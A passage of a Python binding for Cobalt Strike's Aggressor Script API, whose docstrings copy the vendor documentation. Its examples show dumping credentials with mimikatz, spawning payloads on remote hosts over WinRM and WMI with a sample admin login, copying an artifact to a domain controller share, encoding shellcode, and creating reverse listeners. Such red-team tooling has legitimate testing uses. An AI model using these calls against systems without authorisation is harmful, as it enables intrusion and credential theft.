        Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target host to unlink (specified as an IP address)
        Example
        
        bunlink($1, "172.16.48.3");
        
    """

    return engine.call('bunlink', args, fork=fork)


def bupload(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask a Beacon to upload a file
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the local path to the file to upload
        Example
        
        bupload($1, script_resource("evil.exe"));
        
    """

    return engine.call('bupload', args, fork=fork)


def bupload_raw(*args, silent=False, fork=False):
    r""""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask a Beacon to upload a file
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the remote file name of the file
        $3 - the raw content of the file
        $4 - [optional] the local path to the file (if there is one)
        Example
        
        $data = artifact("my listener", "exe");
        bupload_raw($1, "\\\\DC\\C$\\foo.exe", $data);
        
    """

    return engine.call('bupload_raw', args, silent=silent, fork=fork)


def bwdigest(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to dump in-memory credentials with mimikatz [with the wdigest command]. The &blogonpasswords option is superior to this command.
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        Example
        
        item "Dump &Passwords (WDigest)" {
            binput($1, "wdigest");
            bwdigest($1);
        }
        
        
        
    """

    return engine.call('bwdigest', args, fork=fork)


def bwinrm(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a payload on a remote host. This function uses WinRM to run a PowerShell one-liner
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to spawn a payload onto
        $3 - the listener to spawn
        Example
        
        brev2self();
        bloginuser($1, "CORP", "Administrator", "toor");
        bwinrm($1, "172.16.48.3", "my listener");
        
    """

    return engine.call('bwinrm', args, fork=fork)


def bwmi(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Ask Beacon to spawn a payload on a remote host. This function uses WMI to run a PowerShell one-liner
        Arguments
        $1 - the id for the beacon. This may be an array or a single ID.
        $2 - the target to spawn a payload onto
        $3 - the listener to spawn
        Example
        
        brev2self();
        bloginuser($1, "CORP", "Administrator", "toor");
        bwmi($1, "172.16.48.3", "my listener");
        
    """

    return engine.call('bwmi', args, fork=fork)


def call(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Issue a call to the team server.
        Arguments
        $1 - the command name
        $2 - a callback to receive a response to this request. The callback will receive two arguments. The first is the call name. The second is the response.
        ... - one or more arguments to pass into this call.
        Example
        
        call("aggressor.ping", { warn(@_); }, "this is my value");
        
    """

    return engine.call('call', args, fork=fork)


def closeClient(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Close the current Cobalt Strike team server connection.
        Example
        
        closeClient();
        
    """

    return engine.call('closeClient', args, fork=fork)


def credential_add(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Add a credential to the data model
        Arguments
        $1 - username
        $2 - password
        $3 - realm
        $4 - source
        $5 - host
        Example
        
        command falsecreds {
            for ($x = 0; $x < 100; $x++) {
                credential_add("user $+ $x", "password $+ $x");
            }
        }
        
    """

    return engine.call('credential_add', args, fork=fork)


def credentials(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of application credentials in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each credential entry.
        Example
        
        printAll(credentials());
        
    """

    return engine.call('credentials', args, fork=fork)


def data_keys(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        List the query-able keys from Cobalt Strike's data model
        Returns
        A list of keys that you may query with &data_query
        Example
        
        foreach $key (data_keys()) {
            println("\n\c4=== $key ===\n");
            println(data_query($key));
        }
        
    """

    return engine.call('data_keys', args, fork=fork)


def data_query(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Queries Cobalt Strike's data model
        Arguments
        $1 - the key to pull from the data model
        Returns
        A Sleep representation of the queried data.
        Example
        
        println(data_query("targets"));
        
    """

    return engine.call('data_query', args, fork=fork)


def dbutton_action(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.
        Arguments
        $1 - the $dialog object
        $2 - the button label
        Example
        
        dbutton_action($dialog, "Start");
        dbutton_action($dialog, "Stop");
        
    """

    return engine.call('dbutton_action', args, fork=fork)


def dbutton_help(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.
        Arguments
        $1 - the $dialog object
        $2 - the URL to go to
        Example
        
        dbutton_help($dialog, "http://www.google.com");
        
    """

    return engine.call('dbutton_help', args, fork=fork)


def dialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Create a dialog. Use &dialog_show to show it.
        Arguments
        $1 - the title of the dialog
        $2 - a %dictionary mapping row names to default values
        $3 - a callback function. Called when the user presses a &dbutton_action button. $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.
        Returns
        A scalar with a $dialog object.
        Example
        
        sub callback {
            # prints: Pressed Go, a is: Apple
            println("Pressed $2 $+ , a is: " . $3['a']);
        }
        
        $dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
        drow_text($dialog, "a", "Fruit:  ");
        drow_text($dialog, "b", "Rodent: ");
        dbutton_action($dialog, "Go");
        dialog_show($dialog);
        
    """

    return engine.call('dialog', args, fork=fork)


def dialog_description(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a description to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the description of this dialog
        Example
        
        dialog_description($dialog, "I am the Hello World dialog.");
        
    """

    return engine.call('dialog_description', args, fork=fork)


def dialog_show(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Shows a &dialog.
        Arguments
        $1 - the $dialog object
        Example
        
        dialog_show($dialog);
        
    """

    return engine.call('dialog_show', args, fork=fork)


def dispatch_event(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.
        Arguments
        $1 - the function to call
        Example
        
        dispatch_event({
            println("Hello World");
        });
        
    """

    return engine.call('dispatch_event', args, fork=fork)


def downloads(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of downloads in Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about each downloaded file.
        Example
        
        printAll(downloads());
        
    """

    return engine.call('downloads', args, fork=fork)


def drow_beacon(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a beacon selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_beacon($dialog, "bid", "Session: ");
        
    """

    return engine.call('drow_beacon', args, fork=fork)


def drow_checkbox(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a checkbox to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        $4 - the text next to the checkbox
        Example
        
        drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
        
    """

    return engine.call('drow_checkbox', args, fork=fork)


def drow_combobox(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a combobox to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        $4 - an array of options to choose from
        Example
        
        drow_combobox($dialog, "combo", "Options", @("apple", "bat", "cat"));
        
    """

    return engine.call('drow_combobox', args, fork=fork)


def drow_exploits(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a privilege escalation exploit selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_exploits($dialog, "exploit", "Exploit: ");
        
    """

    return engine.call('drow_exploits', args, fork=fork)


def drow_file(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a file chooser row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_file($dialog, "file", "Choose: ");
        
    """

    return engine.call('drow_file', args, fork=fork)


def drow_interface(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a VPN interface selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_interface($dialog, "int", "Interface: ");
        
    """

    return engine.call('drow_interface', args, fork=fork)


def drow_krbtgt(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a krbtgt selection row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_krbtgt($dialog, "hash", "krbtgt hash: ");
        
    """

    return engine.call('drow_krbtgt', args, fork=fork)


def drow_listener(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a listener selection row to a &dialog. This row does not show SMB listeners.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_listener($dialog, "listener", "Listener: ");
        
    """

    return engine.call('drow_listener', args, fork=fork)


def drow_listener_smb(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a listener selection row to a &dialog. This row shows SMB listeners.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_listener_smb($dialog, "listener", "Listener: ");
        
    """

    return engine.call('drow_listener_smb', args, fork=fork)


def drow_listener_stage(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a listener selection row to a &dialog. This row shows local Beacon listeners with stages only. Foreign listeners and listeners from other servers are excluded.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_listener_stage($dialog, "listener", "Stage: ");
        
    """

    return engine.call('drow_listener_stage', args, fork=fork)


def drow_mailserver(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a mail server field to a &dialog.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_mailserver($dialog, "mail", "SMTP Server: ");
        
    """

    return engine.call('drow_mailserver', args, fork=fork)


def drow_proxyserver(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a proxy server field to a &dialog.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_proxyserver($dialog, "proxy", "Proxy: ");
        
    """

    return engine.call('drow_proxyserver', args, fork=fork)


def drow_site(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a site/URL field to a &dialog.
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_site($dialog, "url", "Site: ");
        
    """

    return engine.call('drow_site', args, fork=fork)


def drow_text(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a text field row to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        $4 - Optional. The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider).
        Example
        
        drow_text($dialog, "name", "Name: ");
        
    """

    return engine.call('drow_text', args, fork=fork)


def drow_text_big(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Adds a multi-line text field to a &dialog
        Arguments
        $1 - a $dialog object
        $2 - the name of this row
        $3 - the label for this row
        Example
        
        drow_text_big($dialog, "addr", "Address: ");
        
    """

    return engine.call('drow_text_big', args, fork=fork)


def dstamp(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Format a time into a date/time value. This value includes seconds.
        Arguments
        $1 - the time [milliseconds since the UNIX epoch]
        Example
        
        println("The time is now: " . dstamp(ticks()));
        
        See Also
        &tstamp
        
    """

    return engine.call('dstamp', args, fork=fork)


def elog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Publish a notification to the event log
        Arguments
        $1 - the message
        Example
        
        elog("The robot invasion has begun!");
        
    """

    return engine.call('elog', args, fork=fork)


def encode(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Obfuscate a position-independent blob of code with an encoder.
        Arguments
        $1 - position independent code (e.g., shellcode, "raw" stageless Beacon) to apply encoder to
        $2 - the encoder to use
        $3 - the architecture (e.g., x86, x64)
        
        
        Encoder
        Description
        
        
        alpha
        Alphanumeric encoder (x86-only)
        
        
        xor
        XOR encoder
        
        
        Notes
        1. The encoded position-independent blob must run from a memory page that has RWX permissions or the decode step will crash the current process.
        2. alpha encoder: The EDI register must contain the address of the encoded blob. &encode prepends a 10-byte (non-alphanumeric) program to the beginning of the alphanumeric encoded blob. This program calculates the location of the encoded blob and sets EDI for you. If you plan to set EDI yourself, you may remove these first 10 bytes.
        Returns
        A position-independent blob that decodes the original string and passes execution to it.
        Example
        
        # generate shellcode for a listener
        $stager = shellcode("my listener", false "x86");
        
        # encode it.
        $stager = encode($stager, "xor", "x86");
        
    """

    return engine.call('encode', args, fork=fork)


def fireAlias(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Runs a user-defined alias
        Arguments
        $1 - the beacon id to run the alias against
        $2 - the alias name to run
        $3 - the arguments to pass to the alias.
        Example
        
        # run the foo alias when a new Beacon comes in
        on beacon_initial {
            fireAlias($1, "foo", "bar!");
        }
        
    """

    return engine.call('fireAlias', args, fork=fork)


def fireEvent(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Fire an event.
        Arguments
        $1 - the event name
        ... - the event arguments.
        Example
        
        on foo {
            println("Argument is: $1");
        }
        
        fireEvent("foo", "Hello World!");
        
    """

    return engine.call('fireEvent', args, fork=fork)


def format_size(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Formats a number into a size (e.g., 1024 => 1kb)
        Arguments
        $1 - the size to format
        Returns
        A string representing a human readable data size.
        Example
        
        println(format_size(1024));
        
        
    """

    return engine.call('format_size', args, fork=fork)


def gunzip(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Decompress a string (GZIP).
        Arguments
        $1 - the string to compress
        Returns
        The argument processed by the gzip de-compressor
        Example
        
        println(gunzip(gzip("this is a test")));
        
        See Also
        &gzip
        
    """

    return engine.call('gunzip', args, fork=fork)


def gzip(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        GZIP a string.
        Arguments
        $1 - the string to compress
        Returns
        The argument processed by the gzip compressor
        Example
        
        println(gzip("this is a test"));
        
        See Also
        &gunzip
    """

    return engine.call('gzip', args, fork=fork)


def host_delete(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Delete a host from the targets model
        Arguments
        $1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
        Example
        
        # clear all hosts
        host_delete(hosts());
        
    """

    return engine.call('host_delete', args, fork=fork)


def host_info(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get information about a target.
        Arguments
        $1 - the host IPv4 or IPv6 address
        $2 - [Optional] the key to extract a value for
        Returns
        
        %info = host_info("address");
        
        Returns a dictionary with known information about this target.
        
        $value = host_info("address", "key");
        
        Returns the value for the specified key from this target's entry in the data model.
        Example
        
        # create a script console alias to dump host info
        command host {
            println("Host $1");
            foreach $key => $value (host_info($1)) {
                println("$[15]key $value");
            }
        }
        
    """

    return engine.call('host_info', args, fork=fork)


def host_update(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Add or update a host in the targets model
        Arguments
        $1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
        $2 - the DNS name of this target
        $3 - the target's operating system
        $4 - the operating system version number (e.g., 10.0)
        $5 - a note for the target.
        Note
        You may specify a $null value for any argument and, if the host exists, no change will be made to that value.
        Example
        
        host_update("192.168.20.3", "DC", "Windows", 10.0);
        
    """

    return engine.call('host_update', args, fork=fork)


def hosts(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of IP addresses from Cobalt Strike's target model
        Returns
        An array of IP addresses
        Example
        
        printAll(hosts());
        
    """

    return engine.call('hosts', args, fork=fork)


def insert_menu(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Bring menus associated with a popup hook into the current menu tree.
        Arguments
        $1 - the popup hook
        ... - additional arguments are passed to the child popup hook.
        Example
        
        popup beacon {
            # menu definitions above this point
        
            insert_menu("beacon_bottom", $1);
        
            # menu definitions below this point
        }
        
    """

    return engine.call('insert_menu', args, fork=fork)


def iprange(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Generate an array of IPv4 addresses based on a string description
        Arguments
        $1 - a string with a description of IPv4 ranges
        
        
        Range
        Result
        
        
        192.168.1.2
        The IP4 address 192.168.1.2
        
        
        192.168.1.1, 192.168.1.2
        The IPv4 addresses 192.168.1.1 and 192.168.1.2
        
        
        192.168.1.0/24
        The IPv4 addresses 192.168.1.0 through 192.168.1.255
        
        
        192.168.1.18-192.168.1.30
        The IPv4 addresses 192.168.1.18 through 192.168.1.29
        
        
        192.168.1.18-30
        The IPv4 addresses 192.168.1.18 through 192.168.1.29
        
        
        Returns
        An array of IPv4 addresses within the specified ranges.
        Example
        
        printAll(iprange("192.168.1.0/25"));
        
    """

    return engine.call('iprange', args, fork=fork)


def keystrokes(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Returns a list of keystrokes from Cobalt Strike's data model.
        Returns
        An array of dictionary objects with information about recorded keystrokes.
        Example
        
        printAll(keystrokes());
        
    """

    return engine.call('keystrokes', args, fork=fork)


def licenseKey(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get the license key for this instance of Cobalt Strike
        Returns
        Your license key.
        Example
        
        println("Your key is: " . licenseKey());
        
    """

    return engine.call('licenseKey', args, fork=fork)


def listener_create(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Create a new listener.
        Arguments
        $1 - the listener name
        $2 - the payload (e.g., windows/beacon_http/reverse_http)
        $3 - the listener host
        $4 - the listener port
        $5 - a comma separated list of addresses for listener to beacon to
        Example
        
        # create a foreign listener
        listener_create("My Metasploit", "windows/foreign_https/reverse_https",
                "ads.losenolove.com", 443);
        
        # create an HTTP Beacon listener
        listener_create("Beacon HTTP", "windows/beacon_http/reverse_http",
                "www.losenolove.com", 80,
                "www.losenolove.com, www2.losenolove.com");
        
    """

    return engine.call('listener_create', args, fork=fork)


def listener_delete(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Stop and remove a listener.
        Arguments
        $1 - the listener name
        Example
        
        listener_delete("Beacon HTTP");
        
    """

    return engine.call('listener_delete', args, fork=fork)


def listener_describe(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Describe a listener.
        Arguments
        $1 - the listener name
        $2 - [Optional] the remote target the listener is destined for
        Returns
        A string describing the listener
        Example
        
        foreach $name (listeners()) {
            println("$name is: " . listener_describe($name));
        }
        
    """

    return engine.call('listener_describe', args, fork=fork)


def listener_info(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get information about a listener.
        Arguments
        $1 - the listener name
        $2 - [Optional] the key to extract a value for
        Returns
        
        %info = listener_info("listener name");
        
        Returns a dictionary with the metadata for this listener.
        
        $value = listener_info("listener name", "key");
        
        Returns the value for the specified key from this listener's metadata
        Example
        
        # create a script console alias to dump listener info
        command dump {
            println("Listener $1");
            foreach $key => $value (listener_info($1)) {
                println("$[15]key $value");
            }
        }
        
    """

    return engine.call('listener_info', args, fork=fork)


def listener_pivot_create(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Create a new pivot listener.
        Arguments
        $1 - the Beacon ID
        $2 - the listener name
        $3 - the payload (e.g., windows/beacon_reverse_tcp)
        $4 - the listener host
        $5 - the listener port
        Note
        The only valid payload argument is windows/beacon_reverse_tcp.
        Example
        
        # create a pivot listener:
        # $1 = beaconID, $2 = name, $3 = port
        alias plisten {
            local('$lhost $bid $name $port');
        
            # extract our arguments
            ($bid, $name, $port) = @_;
        
            # get the name of our target
            $lhost = beacon_info($1, "computer");
        
            btask($1, "create TCP listener on $lhost $+ : $+ $port");
            listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
        }
        
    """

    return engine.call('listener_pivot_create', args, fork=fork)


def listener_restart(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Restart a listener
        Arguments
        $1 - the listener name
        Example
        
        listener_restart("Beacon HTTP");
        
    """

    return engine.call('listener_restart', args, fork=fork)


def listeners(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Return a list of listener names across all team servers this client is connected to.
        Returns
        An array of listener names.
        Example
        
        printAll(listeners());
        
    """

    return engine.call('listeners', args, fork=fork)


def listeners_local(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Return a list of listener names. This function limits itself to the current team server only.
        Returns
        An array of listener names.
        Example
        
        printAll(listeners_local());
        
    """

    return engine.call('listeners_local', args, fork=fork)


def localip(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get the IP address associated with the team server.
        Returns
        A string with the team server's IP address.
        Example
        
        println("I am: " . localip());
        
    """

    return engine.call('localip', args, fork=fork)


def mynick(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Get the nickname associated with the current Cobalt Strike client.
        Returns
        A string with your nickname.
        Example
        
        println("I am: " . mynick());
        
    """

    return engine.call('mynick', args, fork=fork)


def nextTab(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Activate the tab that is to the right of the current tab.
        Example
        
        bind Ctrl+Right {
            nextTab();
        }
        
    """

    return engine.call('nextTab', args, fork=fork)


def on(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Register an event handler. This is an alternate to the on keyword.
        Arguments
        $1 - the name of the event to respond to
        $2 - a callback function. Called when the event happens.
        Example
        
        sub foo {
            blog($1, "Foo!");
        }
        
        on("beacon_initial", &foo);
        
    """

    return engine.call('on', args, fork=fork)


def openAboutDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the "About Cobalt Strike" dialog
        Example
        
        openAboutDialog();
        
    """

    return engine.call('openAboutDialog', args, fork=fork)


def openApplicationManager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the application manager (system profiler results) tab.
        Example
        
        openApplicationManager();
        
    """

    return engine.call('openApplicationManager', args, fork=fork)


def openAutoRunDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the Auto Run / USB attack dialog.
        Example
        
        openAutoRunDialog();
        
    """

    return engine.call('openAutoRunDialog', args, fork=fork)


def openBeaconBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the beacon browser tab.
        Example
        
        openBeaconBrowser();
        
    """

    return engine.call('openBeaconBrowser', args, fork=fork)


def openBeaconConsole(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the console to interact with a Beacon
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Interact" {
            local('$bid');
            foreach $bid ($1) {
                openBeaconConsole($bid);
            }
        }
        
    """

    return engine.call('openBeaconConsole', args, fork=fork)


def openBrowserPivotSetup(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        open the browser pivot setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Browser Pivoting" {
            local('$bid');
            foreach $bid ($1) {
                openBrowserPivotSetup($bid);
            }
        }
        
    """

    return engine.call('openBrowserPivotSetup', args, fork=fork)


def openBypassUACDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog for the Bypass UAC feature.
        Arguments
        $1 - the beacon ID
        Example
        
        item "Bypass UAC" {
            local('$bid');
            foreach $bid ($1) {
                openBypassUACDialog($bid);
            }
        }
        
    """

    return engine.call('openBypassUACDialog', args, fork=fork)


def openCloneSiteDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog for the website clone tool.
        Example
        
        openCloneSiteDialog();
        
    """

    return engine.call('openCloneSiteDialog', args, fork=fork)


def openConnectDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the connect dialog.
        Example
        
        openConnectDialog();
        
    """

    return engine.call('openConnectDialog', args, fork=fork)


def openCovertVPNSetup(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        open the Covert VPN setup dialog
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "VPN Pivoting" {
            local('$bid');
            foreach $bid ($1) {
                openCovertVPNSetup($bid);
            }
        }
        
    """

    return engine.call('openCovertVPNSetup', args, fork=fork)


def openCredentialManager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the credential manager tab.
        Example
        
        openCredentialManager();
        
    """

    return engine.call('openCredentialManager', args, fork=fork)


def openDownloadBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the download browser tab
        Example
        
        openDownloadBrowser();
        
    """

    return engine.call('openDownloadBrowser', args, fork=fork)


def openElevateDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the dialog to launch a privilege escalation exploit.
        Arguments
        $1 - the beacon ID
        Example
        
        item "Elevate" {
            local('$bid');
            foreach $bid ($1) {
                openElevateDialog($bid);
            }
        }
        
    """

    return engine.call('openElevateDialog', args, fork=fork)


def openEventLog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the event log.
        Example
        
        openEventLog();
        
    """

    return engine.call('openEventLog', args, fork=fork)


def openFileBrowser(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the file browser for a Beacon
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Browse Files" {
            local('$bid');
            foreach $bid ($1) {
                openFileBrowser($bid);
            }
        }
        
    """

    return engine.call('openFileBrowser', args, fork=fork)


def openGoldenTicketDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        open a dialog to help generate a golden ticket
        Arguments
        $1 - the Beacon ID to apply this feature to
        Example
        
        item "Golden Ticket" {
            local('$bid');
            foreach $bid ($1) {
                openGoldenTicketDialog($bid);
            }
        }
        
    """

    return engine.call('openGoldenTicketDialog', args, fork=fork)


def openHTMLApplicationDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the HTML Application Dialog.
        Example
        
        openHTMLApplicationDialog();
        
    """

    return engine.call('openHTMLApplicationDialog', args, fork=fork)


def openHostFileDialog(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the host file dialog.
        Example
        
        openHostFileDialog();
        
    """

    return engine.call('openHostFileDialog', args, fork=fork)


def openInterfaceManager(*args, fork=False):
    r"""
    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
        
        Open the tab to manage Covert VPN interfaces
        Example
        
        openInterfaceManager();
        
    """

    return engine.call('openInterfaceManager', args, fork=fork)


def openJavaSignedAppletDialog(*args, fork=False):
    r"""
